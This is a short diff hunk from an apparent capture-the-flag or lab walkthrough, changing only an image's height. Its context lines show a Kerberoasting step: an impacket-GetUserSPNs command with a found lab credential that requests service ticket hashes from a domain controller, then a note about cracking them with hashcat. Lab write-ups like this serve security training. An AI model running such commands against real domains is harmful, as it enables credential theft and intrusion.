@@ -82,7 +82,7 @@ After i found a valid login i used it to perform a kereroast attack on the domai
     impacket-GetUserSPNs -request -dc-ip 10.109.124.214 kingofthehill.local/ghostadmin:Resurrect1 > output.txt
 
 
-<img width="800" height="88" alt="image" src="https://github.com/user-attachments/assets/90c24179-b6ba-4ad0-9ea3-e925cc3e6a4f" />
+<img width="800" height="103" alt="image" src="https://github.com/user-attachments/assets/90c24179-b6ba-4ad0-9ea3-e925cc3e6a4f" />
 
 
 Now that i got the kereberos hashes it was time to crack them with hashcat.
